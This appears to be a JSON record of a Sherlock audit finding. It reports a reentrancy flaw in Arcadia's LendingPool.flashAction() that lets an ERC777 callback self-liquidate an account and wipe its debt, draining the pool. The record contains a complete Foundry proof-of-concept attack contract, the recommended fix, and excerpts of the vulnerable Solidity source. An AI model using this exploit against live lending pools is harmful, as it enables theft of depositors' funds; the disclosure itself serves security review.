{
  "Title": "H-2: Reentrancy in flashAction() allows draining liquidity pools",
  "Content": "# Issue H-2: Reentrancy in flashAction() allows draining liquidity pools \n\nSource: https://github.com/sherlock-audit/2023-12-arcadia-judging/issues/153 \n\n## Found by \n0xadrii, zzykxx\n## Summary\nIt is possible to drain a liquidity pool/creditor if the pool’s asset is an ERC777 token by triggering a reentrancy flow using flash actions.\n\n## Vulnerability Detail\nThe following vulnerability describes a complex flow that allows draining any liquidity pool where the underlying asset is an ERC777 token. Before diving into the vulnerability, it is important to properly understand and highlight some concepts from Arcadia that are relevant in order to allow this vulnerability to take place:\n\n- **Flash actions**: flash actions in Arcadia operate in a similar fashion to flash loans. Any account owner will be able to borrow an arbitrary amount from the creditor without putting any collateral as long as the account remains in a healthy state at the end of execution. The following steps summarize what actually happens when `LendingPool.flashAction()` flow is triggered:\n    1. The amount borrowed (plus fees) will be minted to the account as debt tokens. This means that the amount borrowed in the flash action **will be accounted as debt** during the whole `flashAction()` execution. If a flash action borrowing 30 tokens is triggered for an account that already has 10 tokens in debt, the debt balance of the account will increase to 40 tokens + fees.\n    2. Borrowed asset will be transferred to the `actionTarget`. The `actionTarget` is an **arbitrary address** passed as parameter in the `flashAction()`. It is important to be aware of the fact that transferring the borrowed funds is performed **prior to calling flashActionByCreditor(),** which is the function that will end up verifying the account’s health state. This is the step where the reentrancy will be triggered by the `actionTarget`.\n    3. The account’s `flashActionByCreditor()` function is called. This is the last step in the execution function, where a health check for the account is performed (among other things).\n    \n    ```solidity\n    // LendingPool.sol\n    \n    function flashAction(\n            uint256 amountBorrowed,\n            address account,\n            address actionTarget, \n            bytes calldata actionData,\n            bytes3 referrer\n        ) external whenBorrowNotPaused processInterests {\n            ... \n    \n            uint256 amountBorrowedWithFee = amountBorrowed + amountBorrowed.mulDivUp(originationFee, ONE_4);\n    \n            ...\n     \n            // Mint debt tokens to the Account, debt must be minted before the actions in the Account are performed.\n            _deposit(amountBorrowedWithFee, account);\n    \n            ...\n    \n            // Send Borrowed funds to the actionTarget.\n            asset.safeTransfer(actionTarget, amountBorrowed);\n     \n            // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)\n            // to execute one or more actions (swap, deposit, mint...).\n            // Next the action Target will deposit any of the remaining funds or any of the recipient token\n            // resulting from the actions back into the Account.\n            // As last step, after all assets are deposited back into the Account a final health check is done:\n            // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).\n            // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.\n            {\n                uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n                if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n            }\n     \n            ... \n        }\n    ```\n    \n- **Collateral value:** Each creditor is configured with some risk parameters in the `Registry` contract. One of the risk parameters is the `minUsdValue`, which is the minimum USD value any asset must have when it is deposited into an account for the creditor to consider such collateral as valid. If the asset does not reach the `minUsdValue`, it will simply be accounted with a value of 0. For example: if the `minUsdValue` configured for a given creditor is 100 USD and we deposit an asset in our account worth 99 USD (let’s say 99 USDT), the USDT collateral will be accounted as 0. This means that our USDT will be worth nothing at the eyes of the creditor. However, if we deposit one more USDT token into the account, our USD collateral value will increase to 100 USD, reaching the `minUsdValue`. Now, the creditor will consider our account’s collateral to be worth 100 USD instead of 0 USD.\n- **Liquidations:** Arcadia liquidates unhealthy accounts using a dutch-auction model. When a liquidation is triggered via `Liquidator.liquidateAccount()` all the information regarding the debt and assets from the account will be stored in `auctionInformation_` , which maps account addresses to an `AuctionInformation` struct. An important field in this struct is the `assetShares`, which will store the relative value of each asset, with respect to the total value of the Account.\n    \n    When a user wants to bid for an account in liquidation, the `Liquidator.bid()` function must be called. An important feature from this function is that it does not require the bidder to repay the loan in full (thus getting the full collateral in the account). Instead, the bidder can specify which collateral asset and amount wants to obtain back, and the contract will compute the amount of debt required to be repaid from the bidder for that amount of collateral. If the user wants to repay the full loan, all the collateral in the account will be specified by the bidder.\n    \n\nWith this background, we can now move on to describing the vulnerability in full.\n\nInitially, we will create an account and deposit collateral whose value is in the limit of the configured `minUsdValue` (if the `minUsdValue` is 100 tokens, the ideal amount to have will be 100 tokens to maximize gains). We will see why this is required later. The account’s collateral and debt status will look like this:\n\n![vuln1](https://github.com/sherlock-audit/2023-12-arcadia-judging/assets/1048185/569c3821-2932-4565-bdc3-f4f12f7907b2)\n\n\n\nThe next step after creating the account is to trigger a flash action. As mentioned in the introduction, the borrowed funds will be sent to the `actionTarget` (this will be a contract we create and control). An important requirement is that if the borrowed asset is an ERC777 token, we will be able to execute the ERC777 callback in our `actionTarget` contract, enabling us to gain control of the execution flow. Following our example, if we borrowed 200 tokens the account’s status would look like this:\n\n![vuln2](https://github.com/sherlock-audit/2023-12-arcadia-judging/assets/1048185/a41aee42-d0a2-461e-90fa-787762d2acfb)\n\nOn receiving the borrowed tokens, the actual attack will begin. The`actionTarget` will trigger the `Liquidator.liquidateAccount()` function to liquidate our own account. This is possible because  the funds borrowed using the flash action  are accounted as debt for our account (as we can see in the previous image, the borrowed amount greatly surpasses our account’s collateral value) prior to executing the `actionTarget` ERC777 callback, making the account susceptible of being liquidated. Executing this function will start the auction process and store data relevant to the account and its debt in the `auctionInformation_` mapping. \n\nAfter finishing the `liquidateAccount()` execution, the next step for the `actionTarget` is  to place a bid for our own account auction calling `Liquidator.bid()`. The trick here is to request a small amount from the account’s collateral in the `askedAssetAmounts` array (if we had 100 tokens as collateral in the account, we could ask for only 1). The small requested amount will make the computed `price` to pay for the bid by `_calculateBidPrice()`  be really small so that we can maximize our gains. Another requirement will be to set the `endAuction_` parameter to `true` (we will see why later):\n\n```solidity\n// Liquidator.sol\n\nfunction bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {\n        AuctionInformation storage auctionInformation_ = auctionInformation[account];\n        if (!auctionInformation_.inAuction) revert LiquidatorErrors.NotForSale();\n\n        // Calculate the current auction price of the assets being bought.\n        uint256 totalShare = _calculateTotalShare(auctionInformation_, askedAssetAmounts);\n        uint256 price = _calculateBidPrice(auctionInformation_, totalShare);\n\t\t\t\t\n\t\t\t\t// Transfer an amount of \"price\" in \"Numeraire\" to the LendingPool to repay the Accounts debt.\n        // The LendingPool will call a \"transferFrom\" from the bidder to the pool -> the bidder must approve the LendingPool.\n        // If the amount transferred would exceed the debt, the surplus is paid out to the Account Owner and earlyTerminate is True.\n        uint128 startDebt = auctionInformation_.startDebt;\n        bool earlyTerminate = ILendingPool(auctionInformation_.creditor).auctionRepay(\n            startDebt, auctionInformation_.minimumMargin, price, account, msg.sender\n        );\n\t\t...\n}\n```\n\nAfter computing the small price to pay for the bid, the`LendingPool.auctionRepay()` will be called. Because we are repaying a really small amount from the debt, the `accountDebt <= amount` condition will NOT hold, so the only actions performed by `LendingPool.auctionRepay()` will be transferring the small amount of tokens to pay the bid, and `_withdraw()` (burn) the corresponding debt from the account (a small amount of debt will be burnt here because the bid amount is small). It is also important to note that the `earlyTerminate` flag will remain as `false`:\n\n```solidity\n// LendingPool.sol\n\nfunction auctionRepay(uint256 startDebt, uint256 minimumMargin_, uint256 amount, address account, address bidder)\n        external\n        whenLiquidationNotPaused\n        onlyLiquidator \n        processInterests\n        returns (bool earlyTerminate)\n    {\n        // Need to transfer before burning debt or ERC777s could reenter.\n        // Address(this) is trusted -> no risk on re-entrancy attack after transfer.\n        asset.safeTransferFrom(bidder, address(this), amount);\n\n        uint256 accountDebt = maxWithdraw(account); \n        if (accountDebt == 0) revert LendingPoolErrors.IsNotAnAccountWithDebt();\n        if (accountDebt <= amount) {\n            // The amount recovered by selling assets during the auction is bigger than the total debt of the Account.\n            // -> Terminate the auction and make the surplus available to the Account-Owner.\n            earlyTerminate = true;\n            unchecked {\n                _settleLiquidationHappyFlow(account, startDebt, minimumMargin_, bidder, (amount - accountDebt));\n            }\n            amount = accountDebt;\n        }\n  \n        _withdraw(amount, address(this), account); \n\n        emit Repay(account, bidder, amount);\n    }\n```\n\nAfter `LendingPool.auctionRepay()` , execution will go back to `Liquidator.bid()`. The account’s `auctionBid()` function will then be called, which will transfer the 1 token requested by the bidder in the `askedAssetAmounts` parameter from the account’s collateral to the bidder. This is the most important concept in the attack. Because 1 token is moving out from the account’s collateral, the current collateral value from the account will be decreased from 100 USD to 99 USD, making the collateral value be under the minimum `minUsdValue` amount of 100 USD, and thus making the collateral value from the account go straight to 0 at the eyes of the creditor:\n\n![vuln3](https://github.com/sherlock-audit/2023-12-arcadia-judging/assets/1048185/498b92d7-6036-4d67-9acd-fdf5e139f930)\n\n\nBecause the `earlyTerminate` was NOT set to `true` in `LendingPool.auctionRepay()`, the `if (earlyTerminate)` condition will be skipped,  going straight to evaluate the `else if (endAuction_)` condition . Because we set the`endAuction_` parameter to true when calling the `bid()` function, `_settleAuction()` will execute.\n\n```solidity\n// Liquidator.sol\n\nfunction bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external nonReentrant {\n        ...\n\t\t\t\t\n\t\t\t\t// Transfer the assets to the bidder.\n        IAccount(account).auctionBid(\n            auctionInformation_.assetAddresses, auctionInformation_.assetIds, askedAssetAmounts, msg.sender\n        );\n        // If all the debt is repaid, the auction must be ended, even if the bidder did not set endAuction to true.\n        if (earlyTerminate) {\n            // Stop the auction, no need to do a health check for the account since it has no debt anymore.\n            _endAuction(account);\n        }\n        // If not all debt is repaid, the bidder can still earn a termination incentive by ending the auction\n        // if one of the conditions to end the auction is met.\n        // \"_endAuction()\" will silently fail without reverting, if the auction was not successfully ended.\n        else if (endAuction_) {\n            if (_settleAuction(account, auctionInformation_)) _endAuction(account);\n        } \n    }\n```\n\n`_settleAuction()` is where the final steps of the attack will take place. Because we made the collateral value of our account purposely decrease from the `minUsdValue`, `_settleAuction` will interpret that all collateral has been sold, and the `else if (collateralValue == 0)` will evaluate to true, making the creditor’s `settleLiquidationUnhappyFlow()` function be called:\n\n```solidity\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n        internal\n        returns (bool success)\n    {\n        // Cache variables.\n        uint256 startDebt = auctionInformation_.startDebt;\n        address creditor = auctionInformation_.creditor;\n        uint96 minimumMargin = auctionInformation_.minimumMargin;\n\n        uint256 collateralValue = IAccount(account).getCollateralValue();\n        uint256 usedMargin = IAccount(account).getUsedMargin();\n \n        // Check the different conditions to end the auction.\n        if (collateralValue >= usedMargin || usedMargin == minimumMargin) { \n            // Happy flow: Account is back in a healthy state.\n            // An Account is healthy if the collateral value is equal or greater than the used margin.\n            // If usedMargin is equal to minimumMargin, the open liabilities are 0 and the Account is always healthy.\n            ILendingPool(creditor).settleLiquidationHappyFlow(account, startDebt, minimumMargin, msg.sender);\n        } else if (collateralValue == 0) {\n            // Unhappy flow: All collateral is sold.\n            ILendingPool(creditor).settleLiquidationUnhappyFlow(account, startDebt, minimumMargin, msg.sender);\n        }\n\t\t\t\t...\n\t\t\t\t \n\t\t\t\t\n        return true;\n    }\n```\n\nExecuting the `settleLiquidationUnhappyFlow()` will burn ALL the remaining debt (`balanceOf[account]` will return all the remaining balance of debt tokens for the account), and the liquidation will be finished, calling `_endLiquidation()` and leaving the account with 99 tokens of collateral and a 0 amount of debt (and the `actionTarget` with ALL the borrowed funds taken from the flash action).\n\n```solidity\n// LendingPool.sol\n\nfunction settleLiquidationUnhappyFlow(\n        address account,\n        uint256 startDebt,\n        uint256 minimumMargin_,\n        address terminator\n    ) external whenLiquidationNotPaused onlyLiquidator processInterests {\n        ...\n\n        // Any remaining debt that was not recovered during the auction must be written off.\n        // Depending on the size of the remaining debt, different stakeholders will be impacted.\n        uint256 debtShares = balanceOf[account];\n        uint256 openDebt = convertToAssets(debtShares);\n        uint256 badDebt;\n        ...\n\n        // Remove the remaining debt from the Account now that it is written off from the liquidation incentives/Liquidity Providers.\n        _burn(account, debtShares);\n        realisedDebt -= openDebt;\n        emit Withdraw(msg.sender, account, account, openDebt, debtShares);\n\n        _endLiquidation();\n\n        emit AuctionFinished(\n            account, address(this), startDebt, initiationReward, terminationReward, liquidationPenalty, badDebt, 0\n        );\n    }\n```\n\nAfter the `actionTarget`'s ERC777 callback execution, the execution flow will return to the initially called `flashAction()` function, and the final `IAccount(account).flashActionByCreditor()` function will be called, which will pass all the health checks due to the fact that all the debt from the account was burnt:\n\n```solidity\n// LendingPool.sol\n\nfunction flashAction(\n        uint256 amountBorrowed,\n        address account,\n        address actionTarget, \n        bytes calldata actionData,\n        bytes3 referrer\n    ) external whenBorrowNotPaused processInterests {\n        \n\t\t\t\t... \n \n        // The Action Target will use the borrowed funds (optionally with additional assets withdrawn from the Account)\n        // to execute one or more actions (swap, deposit, mint...).\n        // Next the action Target will deposit any of the remaining funds or any of the recipient token\n        // resulting from the actions back into the Account.\n        // As last step, after all assets are deposited back into the Account a final health check is done:\n        // The Collateral Value of all assets in the Account is bigger than the total liabilities against the Account (including the debt taken during this function).\n        // flashActionByCreditor also checks that the Account indeed has opened a margin account for this Lending Pool.\n        {\n            uint256 accountVersion = IAccount(account).flashActionByCreditor(actionTarget, actionData);\n            if (!isValidVersion[accountVersion]) revert LendingPoolErrors.InvalidVersion();\n        }\n \n        ... \n    }\n```\n\n```solidity\n// AccountV1.sol\n\nfunction flashActionByCreditor(address actionTarget, bytes calldata actionData)\n        external\n        nonReentrant\n        notDuringAuction\n        updateActionTimestamp\n        returns (uint256 accountVersion)\n    {\n        \n\t\t\t\t...\n\n        // Account must be healthy after actions are executed.\n        if (isAccountUnhealthy()) revert AccountErrors.AccountUnhealthy();\n\n        ...\n    }\n```\n\n## Proof of Concept\n\nThe following proof of concept illustrates how the previously described attack  can take place. Follow the steps in order to reproduce it:\n\n1. Create a `ERC777Mock.sol` file in `lib/accounts-v2/test/utils/mocks/tokens` and paste the code found in [this github gist](https://gist.github.com/0xadrii/3677f0b5dfb9dcfe6b8b3953115d03f5).\n2. Import the ERC777Mock and change the MockOracles, MockERC20 and Rates structs in `lib/accounts-v2/test/utils/Types.sol` to add an additional `token777ToUsd`, `token777` of type ERC777Mock and token777ToUsd rate:\n    \n    ```solidity\n    import \"../utils/mocks/tokens/ERC777Mock.sol\"; // <----- Import this\n    \n    ...\n    \n    struct MockOracles {\n        ArcadiaOracle stable1ToUsd;\n        ArcadiaOracle stable2ToUsd;\n        ArcadiaOracle token1ToUsd;\n        ArcadiaOracle token2ToUsd;\n        ArcadiaOracle token3ToToken4;\n        ArcadiaOracle token4ToUsd;\n        ArcadiaOracle token777ToUsd; // <----- Add this\n        ArcadiaOracle nft1ToToken1;\n        ArcadiaOracle nft2ToUsd;\n        ArcadiaOracle nft3ToToken1;\n        ArcadiaOracle sft1ToToken1;\n        ArcadiaOracle sft2ToUsd;\n    }\n    \n    struct MockERC20 {\n        ERC20Mock stable1;\n        ERC20Mock stable2;\n        ERC20Mock token1;\n        ERC20Mock token2;\n        ERC20Mock token3;\n        ERC20Mock token4;\n        ERC777Mock token777; // <----- Add this\n    }\n    \n    ...\n    \n    struct Rates {\n        uint256 stable1ToUsd;\n        uint256 stable2ToUsd;\n        uint256 token1ToUsd;\n        uint256 token2ToUsd;\n        uint256 token3ToToken4;\n        uint256 token4ToUsd;\n        uint256 token777ToUsd; // <----- Add this\n        uint256 nft1ToToken1;\n        uint256 nft2ToUsd;\n        uint256 nft3ToToken1;\n        uint256 sft1ToToken1;\n        uint256 sft2ToUsd;\n    }\n    ```\n    \n3. Replace the contents inside `lib/accounts-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/2eab11990f47385b584d6405cafa1d08).\n4. To finish the setup, replace the file found in `lending-v2/test/fuzz/Fuzz.t.sol` for the code found in [this github gist](https://gist.github.com/0xadrii/eeac07109792c24268a00ac8e4b3339d).\n5. For the actual proof of concept, create a `Poc.t.sol` file in `test/fuzz/LendingPool` and paste the following code. The code contains the proof of concept test, as well as the action target implementation:\n    \n    ```solidity\n    \n    /**\n     * Created by Pragma Labs\n     * SPDX-License-Identifier: BUSL-1.1\n     */\n    pragma solidity 0.8.22;\n    \n    import { LendingPool_Fuzz_Test } from \"./_LendingPool.fuzz.t.sol\";\n    \n    import { ActionData, IActionBase } from \"../../../lib/accounts-v2/src/interfaces/IActionBase.sol\";\n    import { IPermit2 } from \"../../../lib/accounts-v2/src/interfaces/IPermit2.sol\";\n    \n    /// @notice Proof of Concept - Arcadia\n    contract Poc is LendingPool_Fuzz_Test {\n    \n        /////////////////////////////////////////////////////////////////\n        //                        TEST CONTRACTS                       //\n        /////////////////////////////////////////////////////////////////\n    \n        ActionHandler internal actionHandler;\n        bytes internal callData;\n    \n        /////////////////////////////////////////////////////////////////\n        //                          SETUP                              //\n        /////////////////////////////////////////////////////////////////\n    \n        function setUp() public override {\n            // Setup pool test\n            LendingPool_Fuzz_Test.setUp();\n    \n            // Deploy action handler\n            vm.prank(users.creatorAddress);\n            actionHandler = new ActionHandler(address(liquidator), address(proxyAccount));\n    \n            // Set origination fee\n            vm.prank(users.creatorAddress);\n            pool.setOriginationFee(100); // 1%\n    \n            // Transfer some tokens to actiontarget to perform liquidation repayment and approve tokens to be transferred to pool \n            vm.startPrank(users.liquidityProvider);\n            mockERC20.token777.transfer(address(actionHandler), 1 ether);\n            mockERC20.token777.approve(address(pool), type(uint256).max);\n    \n            // Deposit 100 erc777 tokens into pool\n            vm.startPrank(address(srTranche));\n            pool.depositInLendingPool(100 ether, users.liquidityProvider);\n            assertEq(mockERC20.token777.balanceOf(address(pool)), 100 ether);\n    \n            // Approve creditor from actiontarget for bid payment\n            vm.startPrank(address(actionHandler));\n            mockERC20.token777.approve(address(pool), type(uint256).max);\n    \n        }\n    \n        /////////////////////////////////////////////////////////////////\n        //                           POC                               //\n        /////////////////////////////////////////////////////////////////\n        /// @notice Test exploiting the reentrancy vulnerability. \n        /// Prerequisites:\n        /// - Create an actionTarget contract that will trigger the attack flow using the ERC777 callback when receiving the \n        ///   borrowed funds in the flash action.\n        /// - Have some liquidity deposited in the pool in order to be able to borrow it\n        /// Attack:\n        /// 1. Open a margin account in the creditor to be exploited.\n        /// 2. Deposit a small amount of collateral. This amount needs to be big enough to cover the `minUsdValue` configured\n        /// in the registry for the given creditor.\n        /// 3. Create the `actionData` for the account's `flashAction()` function. The data contained in it (withdrawData, transferFromOwnerData,\n        /// permit, signature and actionTargetData) can be empty, given that such data is not required for the attack.\n        /// 4. Trigger LendingPool.flashAction(). The execution flow will:\n        ///     a. Mint the flash-actioned debt to the account\n        ///     b. Send the borrowed funds to the action target\n        ///     c. The action target will execute the ERC777 `tokensReceived()` callback, which will:\n        ///        - Trigger Liquidator.liquidateAccount(), which will set the account in an auction state\n        ///        - Trigger Liquidator.bid(). \n     \n        function testVuln_reentrancyInFlashActionEnablesStealingAllProtocolFunds(\n            uint128 amountLoaned,\n            uint112 collateralValue,\n            uint128 liquidity,\n            uint8 originationFee\n        ) public {   \n    \n            //----------            STEP 1            ----------//\n            // Open a margin account\n            vm.startPrank(users.accountOwner);\n            proxyAccount.openMarginAccount(address(pool)); \n            \n            //----------            STEP 2            ----------//\n            // Deposit 1 stable token in the account as collateral.\n            // Note: The creditors's `minUsdValue` is set to 1 * 10 ** 18. Because\n            // value is converted to an 18-decimal number and the asset is pegged to 1 dollar,\n            // depositing an amount of 1 * 10 ** 6 is the actual minimum usd amount so that the \n            // account's collateral value is not considered as 0.\n            depositTokenInAccount(proxyAccount, mockERC20.stable1, 1 * 10 ** 6);\n            assertEq(proxyAccount.getCollateralValue(), 1 * 10 ** 18);\n    \n            //----------            STEP 3            ----------//\n            // Create empty action data. The action handler won't withdraw/deposit any asset from the account \n            // when the `flashAction()` callback in the account is triggered. Hence, action data will contain empty elements.\n            callData = _buildActionData();\n    \n            // Fetch balances from the action handler (who will receive all the borrowed funds from the flash action)\n            // as well as the pool. \n            // Action handler balance initially has 1 token of token777 (given initially on deployment)\n            assertEq(mockERC20.token777.balanceOf(address(actionHandler)), 1 * 10 ** 18);\n            uint256 liquidityPoolBalanceBefore =  mockERC20.token777.balanceOf(address(pool));\n            uint256 actionHandlerBalanceBefore =  mockERC20.token777.balanceOf(address(actionHandler));\n            // Pool initially has 100 tokens of token777 (deposited by the liquidity provider in setUp())\n            assertEq(mockERC20.token777.balanceOf(address(pool)), 100 * 10 ** 18);\n    \n            //----------            STEP 4            ----------//\n            // Step 4. Trigger the flash action.\n            vm.startPrank(users.accountOwner);\n    \n            pool.flashAction(100 ether , address(proxyAccount), address(actionHandler), callData, emptyBytes3);\n            vm.stopPrank();\n     \n            \n            //----------       FINAL ASSERTIONS       ----------//\n    \n            // Action handler (who is the receiver of the borrowed funds in the flash action) has succesfully obtained 100 tokens from \n            //the pool, and in the end it has nearly 101 tokens (initially it had 1 token, plus the 100 tokens stolen \n            // from the pool minus the small amount required to pay for the bid)\n            assertGt(mockERC20.token777.balanceOf(address(actionHandler)), 100 * 10 ** 18);\n    \n            // On the other hand, pool has lost nearly all of its balance, only remaining the small amount paid from the \n            // action handler in order to bid\n            assertLt(mockERC20.token777.balanceOf(address(pool)), 0.05 * 10 ** 18);\n        \n        } \n    \n        /// @notice Internal function to build the `actionData` payload needed to execute the `flashActionByCreditor()` \n        /// callback when requesting a flash action\n        function _buildActionData() internal returns(bytes memory) {\n            ActionData memory emptyActionData;\n            address[] memory to;\n            bytes[] memory data;\n            bytes memory actionTargetData = abi.encode(emptyActionData, to, data);\n            IPermit2.PermitBatchTransferFrom memory permit;\n            bytes memory signature;\n            return abi.encode(emptyActionData, emptyActionData, permit, signature, actionTargetData);\n        }\n    }\n    \n    /// @notice ERC777Recipient interface\n    interface IERC777Recipient {\n       \n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external;\n    }\n    \n     /// @notice Liquidator interface\n    interface ILiquidator {\n        function liquidateAccount(address account) external;\n        function bid(address account, uint256[] memory askedAssetAmounts, bool endAuction_) external;\n    }\n    \n     /// @notice actionHandler contract that will trigger the attack via ERC777's `tokensReceived()` callback\n    contract ActionHandler is IERC777Recipient, IActionBase {\n    \n        ILiquidator public immutable liquidator;\n        address public immutable account;\n        uint256 triggered;\n    \n        constructor(address _liquidator, address _account) {\n            liquidator = ILiquidator(_liquidator);\n            account = _account;\n        }  \n    \n    \t\t /// @notice ERC777 callback function\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n            // Only trigger the callback once (avoid triggering it while receiving funds in the setup + when receiving final funds)\n            if(triggered == 1) {\n                triggered = 2;\n                liquidator.liquidateAccount(account);\n                uint256[] memory askedAssetAmounts = new uint256[](1);\n                askedAssetAmounts[0] = 1; // only ask for 1 wei of token so that we repay a small share of the debt\n                liquidator.bid(account, askedAssetAmounts, true);\n            }\n    \t\t\t\tunchecked{\n    \t        triggered++;\n    \t\t\t\t}\n        }\n    \n        function executeAction(bytes calldata actionTargetData) external returns (ActionData memory) {\n            ActionData memory data;\n            return data;\n        }\n    \n    }\n    ```\n    \n6. Execute the proof of concept with the following command (being inside the `lending-v2` folder): `forge test --mt testVuln_reentrancyInFlashActionEnablesStealingAllProtocolFunds`\n\n## Impact\n\nThe impact for this vulnerability is high.  All funds deposited in creditors with ERC777 tokens as the underlying asset can be drained.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L567\n\n## Tool used\n\nManual Review, foundry\n\n## Recommendation\n\nThis attack is possible because the `getCollateralValue()` function returns a 0 collateral value due to the `minUsdValue` mentioned before not being reached after executing the bid. The Liquidator’s `_settleAuction()` function then believes the collateral held in the account is 0.\n\nIn order to mitigate the issue, consider fetching the actual real collateral value inside `_settleAuction()` even if it is less than the `minUsdValue` held in the account, so that the function can properly check if the full collateral was sold or not.\n\n```solidity\n// Liquidator.sol\nfunction _settleAuction(address account, AuctionInformation storage auctionInformation_)\n        internal\n        returns (bool success)\n    {\n        ...\n\n        uint256 collateralValue = IAccount(account).getCollateralValue(); // <----- Fetch the REAL collateral value instead of reducing it to 0 if `minUsdValue` is not reached\n        \n \n        ...\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  valid: high(2)\n\n\n\n**sherlock-admin**\n\nThe protocol team fixed this issue in PR/commit https://github.com/arcadia-finance/lending-v2/pull/133.\n\n**Thomas-Smets**\n\nFix consists out of two PR's:\n- accounts: https://github.com/arcadia-finance/accounts-v2/pull/173\n- l",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/137",
  "Code": [
    {
      "filename": "lending-v2/src/LendingPool.sol",
      "content": "/**\n * Created by Pragma Labs\n * SPDX-License-Identifier: BUSL-1.1\n */\npragma solidity 0.8.22;\n\nimport { Creditor } from \"../lib/accounts-v2/src/abstracts/Creditor.sol\";\nimport { DebtToken, ERC20, ERC4626 } from \"./DebtToken.sol\";\nimport { FixedPointMathLib } from \"../lib/solmate/src/utils/FixedPointMathLib.sol\";\nimport { IAccount } from \"./interfaces/IAccount.sol\";\nimport { IFactory } from \"./interfaces/IFactory.sol\";\nimport { ILendingPool } from \"./interfaces/ILendingPool.sol\";\nimport { ITranche } from \"./interfaces/ITranche.sol\";\nimport { LendingPoolErrors } from \"./libraries/Errors.sol\";\nimport { LendingPoolGuardian } from \"./guardians/LendingPoolGuardian.sol\";\nimport { LogExpMath } from \"./libraries/LogExpMath.sol\";\nimport { SafeCastLib } from \"../lib/solmate/src/utils/SafeCastLib.sol\";\nimport { SafeTransferLib } from \"../lib/solmate/src/utils/SafeTransferLib.sol\";\n\n/**\n * @title Arcadia LendingPool.\n * @author Pragma Labs\n * @notice The Lending pool is responsible for the:\n * - Accounting of the liabilities of borrowers via the debtTokens (ERC4626).\n * - Accounting of the liquidity of the Liquidity Providers, via one or more Tranche(s) (ERC4626).\n * - Management of issuing and repaying debt.\n * - Management of interest payments.\n * - Settlement of liquidations and default events.\n */\ncontract LendingPool is LendingPoolGuardian, Creditor, DebtToken, ILendingPool {\n    using FixedPointMathLib for uint256;\n    using SafeTransferLib for ERC20;\n\n    /* //////////////////////////////////////////////////////////////\n                                CONSTANTS\n    ////////////////////////////////////////////////////////////// */\n\n    // Seconds per year, leap years ignored.\n    uint256 internal constant YEARLY_SECONDS = 31_536_000;\n    // Contract address of the Arcadia Account Factory.\n    address internal immutable ACCOUNT_FACTORY;\n    // Contract address of the Liquidator contract.\n    address internal immutable LIQUIDATOR;\n    // The unit for fixed point numbers with 4 decimals precision.\n    uint256 internal constant ONE_4 = 10_000;\n    // Maximum total liquidation penalty, 4 decimal precision.\n    uint256 internal constant MAX_TOTAL_PENALTY = 1100;\n\n    /* //////////////////////////////////////////////////////////////\n                                STORAGE\n    ////////////////////////////////////////////////////////////// */\n\n    // The current interest rate, 18 decimals precision.\n    uint80 public interestRate;\n    // The interest rate when utilisation is 0.\n    // 18 decimals precision.\n    uint72 internal baseRatePerYear;\n    // The slope of the first curve, defined as the delta in interest rate for a delta in utilisation of 100%.\n    // 18 decimals precision.\n    uint72 internal lowSlopePerYear;\n    // The slope of the second curve, defined as the delta in interest rate for a delta in utilisation of 100%.\n    // 18 decimals precision.\n    uint72 internal highSlopePerYear;\n    // The optimal capital utilisation, where we go from the first curve to the steeper second curve.\n    // 4 decimal precision.\n    uint16 internal utilisationThreshold;\n    // Last timestamp that interests were realized.\n    uint32 internal lastSyncedTimestamp;\n    // Fee issued upon taking debt, 4 decimals precision (10 equals 0.001 or 0.1%), capped at 255 (2.55%).\n    uint8 public originationFee;\n    // Sum of all the interest weights of the tranches + treasury.\n    uint24 internal totalInterestWeight;\n    // Fraction (interestWeightTreasury / totalInterestWeight) of the interest fees that go to the treasury.\n    uint16 internal interestWeightTreasury;\n    // Fraction (liquidationWeightTreasury / totalLiquidationWeight) of the liquidation fees that goes to the treasury.\n    uint16 internal liquidationWeightTreasury;\n    // Fraction (liquidationWeightTranche / totalLiquidationWeight) of the liquidation fees that goes to the most Junior Tranche.\n    uint16 internal liquidationWeightTranche;\n\n    // Total amount of `underlying asset` that is claimable by the LPs. Does not take into account pending interests.\n    uint128 internal totalRealisedLiquidity;\n    // The minimum amount of collateral that must be held in an Account before a position can be opened.\n    uint96 internal minimumMargin;\n\n    // Address of the protocol treasury.\n    address internal treasury;\n    // Number of auctions that are currently in progress.\n    uint16 internal auctionsInProgress;\n    // Maximum amount of `underlying asset` that is paid as fee to the initiator/terminator of a liquidation.\n    uint80 internal maxReward;\n    // Minimum initiation and termination reward, relative to the minimumMargin, 4 decimal precision.\n    uint16 internal minRewardWeight;\n    // Fee paid to the Liquidation Initiator.\n    // Defined as a fraction of the openDebt with 4 decimals precision.\n    // Absolute fee can be further capped to a max amount by the creditor.\n    uint16 internal initiationWeight;\n    // Penalty the Account owner has to pay to the Creditor on top of the open Debt for being liquidated.\n    // Defined as a fraction of the openDebt with 4 decimals precision.\n    uint16 internal penaltyWeight;\n    // Fee paid to the address that is ending an auction.\n    // Defined as a fraction of the openDebt with 4 decimals precision.\n    uint16 internal terminationWeight;\n\n    // Array of the interest weights of each Tranche.\n    // Fraction (interestWeightTranches[i] / totalInterestWeight) of the interest fees that go to Tranche i.\n    uint16[] internal interestWeightTranches;\n    // Array of the contract addresses of the Tranches.\n    address[] internal tranches;\n\n    // Map tranche => status.\n    mapping(address => bool) internal isTranche;\n    // Map tranche => interestWeight.\n    // Fraction (interestWeightTranches[i] / totalInterestWeight) of the interest fees that go to Tranche i.\n    mapping(address => uint256) internal interestWeight;\n    // Map tranche => realisedLiquidity.\n    // Amount of `underlying asset` that is claimable by the liquidity 